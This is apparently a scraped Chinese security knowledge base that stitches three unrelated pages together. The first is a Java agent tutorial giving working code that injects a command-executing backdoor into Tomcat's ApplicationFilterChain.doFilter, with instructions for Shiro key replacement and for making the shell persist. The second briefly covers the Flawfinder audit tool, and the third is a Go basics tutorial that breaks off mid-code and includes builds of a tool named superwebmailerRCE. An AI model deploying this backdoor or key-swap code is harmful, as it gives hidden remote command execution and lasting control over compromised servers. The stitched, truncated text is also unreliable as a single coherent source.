ClassPool是CtClass对象的容器。CtClass对象必须从该对象获得。如果get()在此对象上调用，则它将搜索表示的各种源ClassPath 以查找类文件，然后创建一个CtClass表示该类文件的对象。创建的对象将返回给调用者。 简单来说，这就是个容器，存放的是CtClass对象。 获得方法： ClassPool cp = ClassPool.getDefault();。通过 ClassPool.getDefault() 获取的 ClassPool 使用 JVM 的类搜索路径。如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类，因为 Web 服务器使用多个类加载器作为系统类加载器。在这种情况下，ClassPool 必须添加额外的类搜索路径。 cp.insertClassPath(new ClassClassPath()); CtClass 可以把它理解成加强版的Class对象，需要从ClassPool中获得。 获得方法：CtClass cc = cp.get(ClassName)。 CtMethod 同理，可以理解成加强版的Method对象。 获得方法：CtMethod m = cc.getDeclaredMethod(MethodName)。 这个类提供了一些方法，使我们可以便捷的修改方法体： public final class CtMethod extends CtBehavior { // 主要的内容都在父类 CtBehavior 中 } // 父类 CtBehavior public abstract class CtBehavior extends CtMember { // 设置方法体 public void setBody(String src); // 插入在方法体最前面 public void insertBefore(String src); // 插入在方法体最后面 public void insertAfter(String src); // 在方法体的某一行插入内容 public int insertAt(int lineNum, String src); } 传递给方法 insertBefore() ，insertAfter() 和 insertAt() 的 String 对象是由Javassist 的编译器编译的。 由于编译器支持语言扩展，以 $ 开头的几个标识符有特殊的含义： 符号 含义 $0, $1, $2, ... $0 = this; $1 = args[1] ..... $args 方法参数数组.它的类型为 Object[] $$ 所有实参。例如, m($$) 等价于 m($1,$2,...) $cflow(...) cflow 变量 $r 返回结果的类型，用于强制类型转换 $w 包装器类型，用于强制类型转换 $_ 返回值 详细的内容可以看Javassist 使用指南（二）。 示例 举例说明一下是如何动态修改类字节码的 先说2个注意点： 如果在使用过程中找不到javassist包中的类（因为目标环境也需要这个类库，不然会找不到Class），那么可以使用URLCLassLoader+反射的方式调用 需要在agent.jar中的MANIFEST.MF中添加Can-Retransform-Classes: true，不然会抛出异常UnmodifiableClassException 被动态修改的类源码，其中Hello类的hello方法是我们要动态修改的目标，用Scanner是为了保证程序不停止，给我们留有操作的时间 // Main.java import java.util.Scanner; public class Main { public static void main(String[] args) { Hello h1 = new Hello(); h1.hello(); System.out.println(\"等待输入...\"); new Scanner(System.in).next(); Hello h2 = new Hello(); h2.hello(); } } // Hello.java public class Hello { public void hello(){ System.out.println(\"hello world\"); } } 运行并获取pid（69484） attach代码还是差不多，主要是给agent.jar附加进去 import com.sun.tools.attach.AgentInitializationException; import com.sun.tools.attach.AgentLoadException; import com.sun.tools.attach.AttachNotSupportedException; import com.sun.tools.attach.VirtualMachine; import java.io.IOException; public class Attach { public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException { // 列出所有的jvm System.out.println(VirtualMachine.list()); String pid = \"69484\"; String jarName = \"/Users/d4m1ts/d4m1ts/java/javaagent/out/artifacts/javaagent_jar/javaagent.jar\"; // 连接到JVM VirtualMachine virtualMachine = VirtualMachine.attach(pid); // 加载agentmain virtualMachine.loadAgent(jarName); // 断开连接 virtualMachine.detach(); System.out.println(\"ends\"); } } AgentMain（主要是添加Transformer和触发Transformer） // AgentMain.java import java.lang.instrument.Instrumentation; import java.lang.instrument.UnmodifiableClassException; public class AgentMain { public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException { Class[] allLoadedClasses = inst.getAllLoadedClasses(); for (Class cls : allLoadedClasses){ // 定位到类 if (cls.getName() == TransformerDemo.editClassName){ // 添加Transformer inst.addTransformer(new TransformerDemo(), true); // 触发Transformer inst.retransformClasses(cls); } } } } // TransformerDemo.java import javassist.*; import java.io.IOException; import java.lang.instrument.ClassFileTransformer; import java.lang.instrument.IllegalClassFormatException; import java.security.ProtectionDomain; // addTransformer()的第一个参数需要ClassFileTransformer这个类的对象 public class TransformerDemo implements ClassFileTransformer { public static String editClassName = \"Hello\"; public static String editMethod = \"hello\"; @Override public byte[] transform(ClassLoader loader, String className, Class classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException { ClassPool classPool = ClassPool.getDefault(); // 添加额外的类搜索路径 if (classBeingRedefined != null){ ClassClassPath classClassPath = new ClassClassPath(classBeingRedefined); classPool.insertClassPath(classClassPath); } // 修改方法hello()，返回 byte[] 字节码 try { CtClass ctClass = classPool.get(editClassName); CtMethod ctMethod = ctClass.getDeclaredMethod(editMethod); String modifySource = \"System.out.println(\\\"TransformerDemo attached\\\");\"; ctMethod.setBody(modifySource); byte[] bytes = ctClass.toBytecode(); ctClass.detach(); return bytes; } catch (NotFoundException e) { e.printStackTrace(); } catch (CannotCompileException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } return new byte[0]; } } 结果，可以看到第二次执行hello()方法时发现该方法被动态的修改了 内存马 既然现在已经能够修改方法体了，那就可以将木马放到某个一定会执行的方法内，这样的话，当访问任意路由的时候，就会调用木马。那么现在的问题就变成了，注入到哪一个类的哪个方法比较好。 众所周知，Spring boot 中内嵌了一个embed Tomcat作为容器，而在网上流传着很多版本的 Tomcat“无文件”内存马。这些内存马大多数都是通过重写/添加Filter来实现的。既然Spring boot 使用了Tomcat，那么能不能照葫芦画瓢，通过Filter，实现一个Spring boot的内存马呢？当然是可以的。 Spring Boot的Filter 给写的Controller下个断点，可以看到执行到controller的时候，会经过很多的doFilter和internalDoFilter方法，它们大多来自于ApplicationFilterChain这个类。 看看ApplicationFilterChain的doFilter方法： @Override public void doFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException { if( Globals.IS_SECURITY_ENABLED ) { final ServletRequest req = request; final ServletResponse res = response; try { java.security.AccessController.doPrivileged( new java.security.PrivilegedExceptionAction() { @Override public Void run() throws ServletException, IOException { internalDoFilter(req,res); return null; } } ); } catch (PrivilegedActionException pe) { ...... } } else { internalDoFilter(request,response); } } 乍一看内容挺多，其实总结下来就是调用this.internalDoFilter()。所以再来简单看一下internalDoFilter()方法： private void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException { // Call the next filter if there is one if (pos 这两个个方法拥有Request和Response参数。如果能重写其中一个，那就能控制所有的请求和响应！因此，用来作为内存马的入口点简直完美。这里我选择doFilter()方法，具体原因会在之后提到。 Java agent修改doFilter 注意: 每次attach之前，需要访问一下spring的web页面，要让Spring Initializing Spring DispatcherServlet 'dispatcherServlet'，加载一下需要的类，不然不会attach成功，因为找不到我们要修改的类，所以也找不到方法，也就无法修改成功 shell中所有类都要用全称，比如java.io.InputStream，不然可能会抛出异常 如果是完全替代方法，记得用{}包裹 可能会出现各种java.lang.NoClassDefFoundError的问题，跟一下这个断点，就会发现缺少各种各样的class文件，跟了一下，发现可能是动态修改字节码后，整个类的class都会出现异常，太离谱了，也不知道网上的大哥们为啥没遇到 接上一个问题，动态修改过的class文件反编译后代码是没问题的，但是还是不知道为啥解决不了找不到类定义的问题 对刚才的agent代码稍微修改即可（实在重写不了doFilter方法了，分析了几天，重写了class就算代码没问题，也会出现java.lang.NoClassDefFoundError的问题） 并且这里为了不破坏原来的方法结构，我们不用CtMethod的setSource，而是用insertBefore方法 AgentMain.java // AgentMain.java import java.lang.instrument.Instrumentation; import java.lang.instrument.UnmodifiableClassException; public class AgentMain { public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException { Class[] allLoadedClasses = inst.getAllLoadedClasses(); for (Class cls : allLoadedClasses){ // 定位到类 if (cls.getName() == TransformerDemo.editClassName){ // 添加Transformer inst.addTransformer(new TransformerDemo(), true); // 触发Transformer inst.retransformClasses(cls); } } } } // TransformerDemo.java import javassist.*; import java.io.IOException; import java.lang.instrument.ClassFileTransformer; import java.lang.instrument.IllegalClassFormatException; import java.security.ProtectionDomain; // addTransformer()的第一个参数需要ClassFileTransformer这个类的对象 public class TransformerDemo implements ClassFileTransformer { public static String editClassName = \"org.apache.catalina.core.ApplicationFilterChain\"; public static String editMethod = \"doFilter\"; public static String memshell = \"\" + \" javax.servlet.http.HttpServletRequest req = $1;\\n\" + \" javax.servlet.http.HttpServletResponse res = $2;\\n\" + \" java.lang.String cmd = req.getParameter(\\\"cmd\\\");\\n\" + \"\\n\" + \" if (cmd != null){\\n\" + \" System.out.println(cmd);\" + \" try {\\n\" + \" java.lang.Runtime.getRuntime().exec(cmd);\\n\" + \" } catch (Exception e){\\n\" + \" e.printStackTrace();\\n\" + \" }\\n\" + \" }\\n\" + \" else{\\n\" + \" internalDoFilter(req,res);\\n\" + \" }\\n\" + \"\"; @Override public byte[] transform(ClassLoader loader, String className, Class classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException { ClassPool classPool = ClassPool.getDefault(); // 添加额外的类搜索路径 if (classBeingRedefined != null) { ClassClassPath classClassPath = new ClassClassPath(classBeingRedefined); classPool.insertClassPath(classClassPath); } // 修改方法doFilter()，返回 byte[] 字节码 try { CtClass ctClass = classPool.get(editClassName); CtMethod ctMethod = ctClass.getDeclaredMethod(editMethod); ctMethod.insertBefore(memshell); ctClass.writeFile(\"/Users/d4m1ts/d4m1ts/java/Temp/out/artifacts/temp_jar\"); System.out.println(memshell); System.out.println(\"injection success\"); byte[] bytes = ctClass.toBytecode(); ctClass.detach(); return bytes; } catch (NotFoundException e) { e.printStackTrace(); } catch (CannotCompileException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } return new byte[0]; } } 给上面的打包成agent.jar，然后通过虚拟机attach到spring jvm中，再执行命令即可（理论上是可以的，网上的文章也都可以成功，但我实在是调不出来为啥了） 拓展操作 通过加载agent可以修改很多类的字节码，所以利用起来操作的空间也很大，不仅仅是内存马这一个点。 一个比较多的利用方法，就是修改shiro的key，这样可以让这个漏洞仅自己可用，避免共享目标权限 重点： 在解析rememberMe的时候，先将其base64解码，然后使用AES解密，在AES解密的时候，会调用org.apache.shiro.mgt.AbstractRememberMeManager#getDecryptionCipherKey()，更改掉这个函数的返回值，就可以更改解密的密钥。 // 使用insertBefore() $0.setCipherKey(org.apache.shiro.codec.Base64.decode(\"4AvVhmFLUs0KTA3Kprsdag==\")); // 使用setBody() return (org.apache.shiro.codec.Base64.decode(\"4AvVhmFLUs0KTA3Kprsdag==\")); 查杀 agent 内存马相比 filter 内存马，会多一步就是我们需要将我们自己的 agent.jar 传到目标上，然后利用代码将 agent.jar 进行注入，注入之后我们就可以将 agent.jar 进行删除，agent 内存马相比 filter 这些内存马相对更难查杀一些 基于javaAgent内存马检测查杀指南 风险 注入agent内存马后，可能存在我上面那种整个网站崩溃的情况；网上有说可能是因为虚拟内存不够了而导致的，但是我设置大了虚拟内存还是不行。。。 所以实战中尽量还是用API型的内存马 内存马复活 换个说法，如何防止内存马重启后失效； 其实也很简单，就是在jvm关闭前，把attach.jar和agentMain.jar都写到磁盘上，然后无限调用attach.jar尝试attach到jvm中； 但是这样感觉更容易被发现了，所谓有得必有失吧emmm 总览 Java Agent 从入门到内存马 浅谈 Java Agent 内存马 Java Agent实现反序列化注入内存shell Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:02 "},"个人知识库/02.代码审计/02.C:C++/01.工具Flawfinder.html":{"url":"个人知识库/02.代码审计/02.C:C++/01.工具Flawfinder.html","title":"01.工具Flawfinder","keywords":"","body":" 前言 开始 使用 其他 前言 审计C/C++的时候，我们一般也会使用fortify先进行扫描，但是问题存在于，如果fortify的配置存在问题，那么扫描是不会有任何结果的，如下显示灰色 所以推荐在做C/C++的代码审计的时候可以尝试一下其他的工具进行扫描如Flawfinder 开始 安装过程很简单，文档也都有说明 pip install flawfinder # 下面这个是给文件进行格式转换，防止flawfinder因为格式原因不能继续扫描文件异常 pip install cvt2utf cvt2utf convert src -i c 使用 以github开源的HAWQ为例：https://github.com/apache/hawq 使用也很简单，毕竟还是需要结合人工来看 查看帮助 flawfinder -h 原生格式保存为csv flawfinder src > res.csv 保存为html flawfinder --html --context --minlevel=4 backend > output.html 其他 C/C++代碼靜態分析工具調研 Automated Audit Example: flawfinder Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-30 18:19:32 "},"个人知识库/03.编程开发/GO/01.GO基础/":{"url":"个人知识库/03.编程开发/GO/01.GO基础/","title":"01.GO基础","keywords":"","body":" 介绍 Hello World GO语言基础 工作空间 环境变量 包路径 包名 包文档 代码结构 代码编译运行 快速运行 安装到本地 远程下载并编译 交叉编译 代码测试 GO标记 标识符 关键字 行分隔符; 注释 字符串连接 格式化字符串 数据类型 数字类型 浮点型 其他数字类型 值类型和引用类型 GO开发基础 声明变量 声明常量 运算符 算术运算符 关系运算符 逻辑运算符 位运算符 赋值运算符 其他运算符 运算符优先级 空白标识符 格式化输出 条件语句 if if...else if...else if...else switch select 循环语句 for for each 无限循环 循环控制 init函数 自定义函数 构造函数与复合字面 作用域 局部变量 全局变量 数组 初始化数组 访问数组 指针 使用指针 空指针 指针数组 结构体 定义结构体 访问成员 结构体作为参数 结构体指针 切片 定义切片 初始化切片 空(nil)切片 切片截取 len()和cap()函数 追加元素 append()和copy()函数 集合(Map) 定义Map 删除元素 范围(Range) 类型转换 递归 阶乘实例 斐波那契数列实例 接口 声明接口 实现接口 new和make new make defer 并发 go程 通道（channel） 通道缓冲区 注意事项 遍历通道 关闭通道 异常处理 生成error Panic异常 恢复 介绍 Go语言(Golang)最初是由Robert Griesemer, Rob Pike, 和 Ken Thompson在谷歌于2007年开发出来的编程语言。Go编程语言是静态类型语言，语法类似于C语言，它提供了垃圾收集，类型安全，动态的输入能力，还有很多先进的内置类型，例如，可变长度数组和映射（键-值对）。它还提供了丰富的标准库。 Go编程语言是在2009年11月正式对外发布，主要是应用谷歌的于一些生产系统链中。 Hello World package main import \"fmt\" func main() { fmt.Println(\"HELLO WORLD\") } go run Hello.go GO语言基础 工作空间 go工具为公共代码仓库中维护的开源代码而设计。 无论会不会公布代码，该模型设置工作环境的方法都是相同的。 Go代码必须放在工作空间内。它其实就是一个目录，其中包含三个子目录： src 目录包含Go的源文件，它们被组织成包（每个目录都对应一个包） pkg 目录包含包对象 bin 目录包含可执行命令 go 工具用于构建src目录中的源码包，并将其生成的二进制文件安装到 pkg 和 bin 目录中。 src 子目录通常包会含多种版本控制的代码仓库（例如Git或Mercurial）， 以此来跟踪一个或多个源码包的开发。 结构举例如下： bin/ hello # 可执行命令 pkg/ linux_amd64/ # 这里会反映出你的操作系统和架构 github.com/user/ stringutil.a # 包对象 src/ github.com/user/ hello/ hello.go # 命令源码 stringutil/ reverse.go # 包源码 环境变量 go env 而 GOPATH 环境变量指定了你的工作空间位置，这也是很重要的一个变量。 首先创建一个工作空间目录，并设置相应的 GOPATH，工作空间可以放在任何地方，我们使用 $HOME/go。 注意，它绝对不能和你的Go安装目录相同。（另一种常见的设置是 GOPATH=$HOME。） 设置GOPATH export GOPATH=$HOME/go 然后将bin添加到环境变量中 export PATH=$PATH:$GOPATH/bin 包路径 标准库中的包有给定的短路径，比如 \"fmt\" 和 \"net/http\"。 对于你自己的包，你必须选择一个基本路径，来保证它不会与将来添加到标准库， 或其它扩展库中的包相冲突。 如果你将你的代码放到了某处的源码库，那就应当使用该源码库的根目录作为你的基本路径。 例如，若你在 GitHub 上有账户 github.com/user 那么它就应该是你的基本路径。 我们将使用 github.com/user 作为基本路径。在你的工作空间里创建一个目录， 我们将源码存放到其中： mkdir -p $GOPATH/src/github.com/user 包名 源文件中的第一个语句必须是 package 名称 这里的 名称 即为导入该包时使用的默认名称。 （一个包中的所有文件都必须使用相同的 名称。） Go的约定是包名为导入路径的最后一个元素：作为 “crypto/rot13” 导入的包应命名为 rot13。 可执行命令必须使用 package main。 链接成单个二进制文件的所有包，其包名无需是唯一的，只有导入路径（它们的完整文件名） 才是唯一的。 包文档 1、使用命令go doc go doc fmt.Println 2、另一种比较常用的方式，是直接进去包内查看源码 代码结构 Go 语言的基础组成有以下几个部分： 包声明 引入包 函数 变量 语句 & 表达式 注释 以上面的hello world代码为例 package main // 定义了包名。必须在源文件中非注释的第一行指明这个文件属于哪个包，如：package main。package main表示一个可独立执行的程序，每个 Go 应用程序都包含一个名为 main 的包。 import \"fmt\" // 引用fmt包（的函数，或其他元素），fmt 包实现了格式化 IO（输入/输出）的函数 func main() { // 程序开始执行的函数。main 函数是每一个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（如果有 init() 函数则会先执行该函数） fmt.Println(\"HELLO WORLD\") // 调用fmt包中的函数，将字符串输出到控制台，并在最后自动增加换行字符 \\n } 其他： //开头的为单行注释，/*开头，并以*/结尾为多行注释 当标识符（包括常量、变量、类型、函数名、结构字段等等）以一个大写字母开头，如：Group1，那么使用这种形式的标识符的对象就可以被外部包的代码所使用（客户端程序需要先导入这个包），这被称为导出（像面向对象语言中的 public）；标识符如果以小写字母开头，则对包外是不可见的，但是他们在整个包的内部是可见并且可用的（像面向对象语言中的 protected ） 函数名首字母小写即为 protected :func getId() {} 函数名首字母大写即为 public : func Printf() {} 代码编译运行 创建目录/Users/d4m1ts/go/src/github.com/damit5/goTest，并编写代码Hello.go，代码如上 快速运行 编写完成代码后，有两种方法可以快速运行 一种是直接动态运行 go run xxx.go 另一种则是先编译成二进制文件再手动执行 go build xxx.go 安装到本地 还有一种方法可以安装到本地，简单来说就是生成二进制文件并且放到bin目录下，如果在项目目录中就直接go install即可，在其他路径则需要带上src后的路径 go install go install github.com/damit5/goTest 无论是安装包还是二进制文件，go 工具都会安装它所依赖的任何东西 如果提示go: go.mod file not found in current directory or any parent directory; see 'go help modules'，说明需要初始化项目，执行 go mod init {项目名} 然后就可以用go install了，生成后的二进制文件自动存放在bin目录中 远程下载并编译 前提是提前上传到github中 若指定的包不在工作空间中，go get就会将会将它放到 GOPATH 指定的第一个工作空间内。（若该包已存在，go get 就会跳过远程获取， 其行为与 go install 相同） go get github.com/damit5/goTest go get -v github.com/damit5/goTest 交叉编译 CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_darwin CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_linux CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_win.exe 代码测试 Go拥有一个轻量级的测试框架，它由 go test 命令和 testing 包构成。 你可以通过创建一个名字以 _test.go 结尾的，包含名为 TestXXX 且签名为 func (t *testing.T) 函数的文件来编写测试。 测试框架会运行每一个这样的函数；若该函数调用了像 t.Error 或 t.Fail 这样表示失败的函数，此测试即表示失败。 实例： package main import ( \"fmt\" \"testing\" ) func sum(a int, b int) int { return a+b } func TestSum(t *testing.T) { a := 10 b := 20 c := sum(a, b) if c == a+b { fmt.Println(\"success\") } else { t.Errorf(\"error happends\") } } 代码编写后，使用如下命令即可测试 go test go test github.com/damit5/goTest GO标记 Go 程序可以由多个标记组成，可以是关键字，标识符，常量，字符串，符号。如以下 GO 语句由 6 个标记组成： fmt.Println(\"Hello, World!\") 6 个标记是(每行一个)： fmt . Println ( \"Hello, World!\" ) 标识符 标识符用来命名变量、类型等程序实体。一个标识符实际上就是一个或是多个字母( A ~ Z 和 a ~ z)数字(0~9)、下划线_组成的序列，但是第一个字符必须是字母或下划线而不能是数字。 关键字 下面列举了 Go 代码中会使用到的 25 个关键字或保留字： break default func interface select case defer go map struct chan else goto package switch const fallthrough if range type continue for import return var 除了以上介绍的这些关键字，Go 语言还有 36 个预定义标识符： append bool byte cap close complex complex64 complex128 uint16 copy false float32 float64 imag int int8 int16 uint32 int32 int64 iota len make new nil panic uint64 print println real recover string true uint uint8 uintptr 行分隔符; 在Go程序中，一行代表一个语句结束。每个语句不需要像 C 家族中的其它语言一样以分号 ; 结尾，因为这些工作都将由 Go 编译器自动完成。 如果你打算将多个语句写在同一行，它们则必须使用 ; 人为区分，但在实际开发中我们并不鼓励这种做法。 注释 注释不会被编译，每一个包应该有相关注释。 // 单行注释 /* 多行注释 */ 字符串连接 和大多数语言一样，连接通过+来实现 fmt.Println(\"HELLO WORLD\\t\" + \"d4m1ts\") 格式化字符串 Go 语言中使用 fmt.Sprintf 格式化字符串并赋值给新串 package main import \"fmt\" func main() { var keyword = \"world\" var name = \"d4m1ts\" var age = 18 var template = \"hello %s %s %d\" var sentence = fmt.Sprintf(template, keyword, name, age) fmt.Println(sentence) } // hello world d4m1ts 18 数据类型 序号 类型和描述 1 布尔型布尔型的值只可以是常量 true 或者 false。一个简单的例子：var b bool = true。 2 数字类型整型 int 和浮点型 float32、float64，Go 语言支持整型和浮点型数字，并且支持复数，其中位的运算采用补码。 3 字符串类型:字符串就是一串固定长度的字符连接起来的字符序列。Go 的字符串是由单个字节连接起来的。Go 语言的字符串的字节使用 UTF-8 编码标识 Unicode 文本。 4 派生类型: 包括：(a) 指针类型（Pointer）(b) 数组类型(c) 结构化类型(struct)(d) Channel 类型(e) 函数类型(f) 切片类型(g) 接口类型（interface）(h) Map 类型 数字类型 Go 也有基于架构的类型，例如：int、uint 和 uintptr。 序号 类型和描述 1 uint8 无符号 8 位整型 (0 到 255) 2 uint16 无符号 16 位整型 (0 到 65535) 3 uint32 无符号 32 位整型 (0 到 4294967295) 4 uint64 无符号 64 位整型 (0 到 18446744073709551615) 5 int8 有符号 8 位整型 (-128 到 127) 6 int16 有符号 16 位整型 (-32768 到 32767) 7 int32 有符号 32 位整型 (-2147483648 到 2147483647) 8 int64 有符号 64 位整型 (-9223372036854775808 到 9223372036854775807) 浮点型 序号 类型和描述 1 float32 IEEE-754 32位浮点型数 2 float64 IEEE-754 64位浮点型数 3 complex64 32 位实数和虚数 4 complex128 64 位实数和虚数 其他数字类型 以下列出了其他更多的数字类型： 序号 类型和描述 1 byte 类似 uint8 2 rune 类似 int32 3 uint 32 或 64 位 4 int 与 uint 一样大小 5 uintptr 无符号整型，用于存放一个指针 值类型和引用类型 值类型是单独记录在内存中的，每2个数据都是独立的，其中一个修改不会影响到另一个 引用类型记录的是指针地址，如果2个数据指向同一个地址，那么其中一个被修改了，另一个也会被修改 所有像 int、float、bool 和 string 这些基本类型都属于值类型，使用这些类型的变量直接指向存在内存中的值 当使用等号 = 将一个变量的值赋值给另一个变量时，如：j = i，实际上是在内存中将 i 的值进行了拷贝，可以通过 &i 来获取变量 i 的内存地址 而更复杂的数据通常会需要使用多个字，这些数据一般使用引用类型保存。 一个引用类型的变量 r1 存储的是 r1 的值所在的内存地址（数字），或内存地址中第一个字所在的位置 这个内存地址称之为指针，这个指针实际上也被存在另外的某一个值中。 同一个引用类型的指针指向的多个字可以是在连续的内存地址中（内存布局是连续的），这也是计算效率最高的一种存储形式；也可以将这些字分散存放在内存中，每个字都指示了下一个字所在的内存地址。 当使用赋值语句 r2 = r1 时，只有引用（地址）被复制。 如果 r1 的值被改变了，那么这个值的所有引用都会指向被修改后的内容，在这个例子中，r2 也会受到影响。 GO开发基础 声明变量 变量名由字母、数字、下划线组成，其中首个字符不能为数字。 声明变量的一般形式是使用 var 关键字： 语法： // 标准语法 var identifier type // 也可以同时声明多个变量 var identifier1, identifier2 type // 1. 指定变量类型，如果没有初始化，则变量默认为零值（没有做初始化时系统默认设置的值） var a int // 0 var b bool // false var c string // \"\" var a []int // nil // 2. 没有指定变量类型，则根据值自行判定变量类型 var d = true // 自动识别为bool // 3. 使用 := 可以快速声明变量 /* := 等价于 var name string; name = \"d4m1ts\" 这种格式只能在函数体中出现 */ name := \"d4m1ts\" // 4. 如果变量已经使用 var 声明过了，再使用 := 声明变量，就产生编译错误 var name = \"d4m1ts\" name := \"d4m1ts\" 单变量声明实例： var a,b int8 a = 1 b = 2 var name = \"d4m1ts\" name1 := \"d4m1ts\" 多变量声明实例： var a,b int = 1,2 c,d := 3,4 任意变量： 如果想接受任意类型的变量，可以用interface 比如var jsonData []map[string]interface{} package main import ( \"fmt\" ) func init() { fmt.Print(\"init\") } func main() { test1(\"123\") test1(1) test2(\"123\",1, \"324\", 12) } // 实现传单个任何类型的参数 func test1(v interface{}) { fmt.Println(v) // 打印 “123” 1 } // 实现传任意多个任意类型的参数 func test2(v ...interface{}) { for _, m := range v { fmt.Println(m) // 依次打印 123 1 324 12 } } interface{}转string var a interface{} a.(string) 声明常量 常量是一个简单值的标识符，在程序运行时，不会被修改的量，一般形式是使用 const 关键字。 常量中的数据类型只可以是布尔型、数字型（整数型、浮点型和复数）和字符串型。 语法： 和变量一样，type可以省略 显式类型定义： const b string = \"abc\" 隐式类型定义： const b = \"abc\" const identifier [type] = value 定义实例： const j = 4 const i,j = 3,4 用作枚举： package main import ( \"fmt\" \"unsafe\" ) func main() { const ( a = \"abc\" b = len(a) c = unsafe.Sizeof(b) ) fmt.Println(c) } // 8 iota： 特殊常量，可以认为是一个可以被编译器修改的常量 iota 在 const关键字出现时将被重置为 0(const 内部的第一行之前)，const 中每新增一行常量声明将使 iota 计数一次(iota 可理解为 const 语句块中的行索引)。 package main import \"fmt\" func main() { const ( a = iota //0 b //1 c //2 d = \"ha\" //独立值，iota += 1 e //\"ha\" iota += 1 f = 100 //iota +=1 g //100 iota +=1 h = iota //7,恢复计数 i //8 ) fmt.Println(a,b,c,d,e,f,g,h,i) } // 0 1 2 ha ha 100 100 7 8 运算符 算术运算符 下表列出了所有Go语言的算术运算符。假定 A 值为 10，B 值为 20。 运算符 描述 实例 + 相加 A + B 输出结果 30 - 相减 A - B 输出结果 -10 * 相乘 A * B 输出结果 200 / 相除 B / A 输出结果 2 % 求余 B % A 输出结果 0 ++ 自增 A++ 输出结果 11 -- 自减 A-- 输出结果 9 关系运算符 下表列出了所有Go语言的关系运算符。假定 A 值为 10，B 值为 20。 运算符 描述 实例 == 检查两个值是否相等，如果相等返回 True 否则返回 False。 (A == B) 为 False != 检查两个值是否不相等，如果不相等返回 True 否则返回 False。 (A != B) 为 True > 检查左边值是否大于右边值，如果是返回 True 否则返回 False。 (A > B) 为 False 检查左边值是否小于右边值，如果是返回 True 否则返回 False。 (A >= 检查左边值是否大于等于右边值，如果是返回 True 否则返回 False。 (A >= B) 为 False 检查左边值是否小于等于右边值，如果是返回 True 否则返回 False。 (A 逻辑运算符 下表列出了所有Go语言的逻辑运算符。假定 A 值为 True，B 值为 False。 运算符 描述 实例 && 逻辑 AND 运算符。 如果两边的操作数都是 True，则条件 True，否则为 False。 (A && B) 为 False \\ \\ 逻辑 OR 运算符。 如果两边的操作数有一个 True，则条件 True，否则为 False。 (A \\ \\ B) 为 True ! 逻辑 NOT 运算符。 如果条件为 True，则逻辑 NOT 条件 False，否则为 True。 !(A && B) 为 True 位运算符 位运算符对整数在内存中的二进制位进行操作。 下表列出了位运算符 &, |, 和 ^ 的计算： p q p & q p \\ q p ^ q 0 0 0 0 0 0 1 0 1 1 1 1 1 1 0 1 0 0 1 1 Go 语言支持的位运算符如下表所示。假定 A 为60，B 为13： 运算符 描述 实例 & 按位与运算符\"&\"是双目运算符。 其功能是参与运算的两数各对应的二进位相与。 (A & B) 结果为 12, 二进制为 0000 1100 \\ 按位或运算符\"\\ \"是双目运算符。 其功能是参与运算的两数各对应的二进位相或 (A \\ B) 结果为 61, 二进制为 0011 1101 ^ 按位异或运算符\"^\"是双目运算符。 其功能是参与运算的两数各对应的二进位相异或，当两对应的二进位相异时，结果为1。 (A ^ B) 结果为 49, 二进制为 0011 0001 左移运算符\" A >> 右移运算符\">>\"是双目运算符。右移n位就是除以2的n次方。 其功能是把\">>\"左边的运算数的各二进位全部右移若干位，\">>\"右边的数指定移动的位数。 A >> 2 结果为 15 ，二进制为 0000 1111 赋值运算符 下表列出了所有Go语言的赋值运算符。 运算符 描述 实例 = 简单的赋值运算符，将一个表达式的值赋给一个左值 C = A + B 将 A + B 表达式结果赋值给 C += 相加后再赋值 C += A 等于 C = C + A -= 相减后再赋值 C -= A 等于 C = C - A *= 相乘后再赋值 C = A 等于 C = C A /= 相除后再赋值 C /= A 等于 C = C / A %= 求余后再赋值 C %= A 等于 C = C % A 左移后赋值 C >>= 右移后赋值 C >>= 2 等于 C = C >> 2 &= 按位与后赋值 C &= 2 等于 C = C & 2 ^= 按位异或后赋值 C ^= 2 等于 C = C ^ 2 \\ = 按位或后赋值 C \\ = 2 等于 C = C \\ 2 其他运算符 下表列出了Go语言的其他运算符。 运算符 描述 实例 & 返回变量存储地址 &a; 将给出变量的实际地址。 * 指针变量。 *a; 是一个指针变量 运算符优先级 有些运算符拥有较高的优先级，二元运算符的运算方向均是从左至右。下表列出了所有运算符以及它们的优先级，由上至下代表优先级由高到低： 优先级 运算符 5 * / % > & &^ 4 + - \\ ^ 3 == != >= 2 && 1 \\ \\ 空白标识符 用 _ 可以代表被丢弃的值，避免一些变量因为没使用导致程序报错 实例： 变量j必须使用，否则会报错 package main import \"fmt\" func main() { a := [] int {1,2,3,4,5} for j,i := range a { fmt.Println(j, i) } } 使用_来丢弃上面的j变量 package main import \"fmt\" func main() { a := [] int {1,2,3,4,5} for _,i := range a { fmt.Println(i) } } 格式化输出 Go采用的格式化打印风格和C的 printf 族类似，但却更加丰富而通用。 这些函数位于 fmt 包中，且函数名首字母均为大写：如 fmt.Printf、fmt.Fprintf，fmt.Sprintf 等。 字符串函数（Sprintf 等）会返回一个字符串，而非填充给定的缓冲区。 常见格式 var t interface{} t = functionOfSomeType() switch t := t.(type) { default: fmt.Printf(\"unexpected type %T\", t) // %T 输出 t 是什么类型 case bool: fmt.Printf(\"boolean %t\\n\", t) // t 是 bool 类型 case int: fmt.Printf(\"integer %d\\n\", t) // t 是 int 类型 case *bool: fmt.Printf(\"pointer to boolean %t\\n\", *t) // t 是 *bool 类型 case *int: fmt.Printf(\"pointer to integer %d\\n\", *t) // t 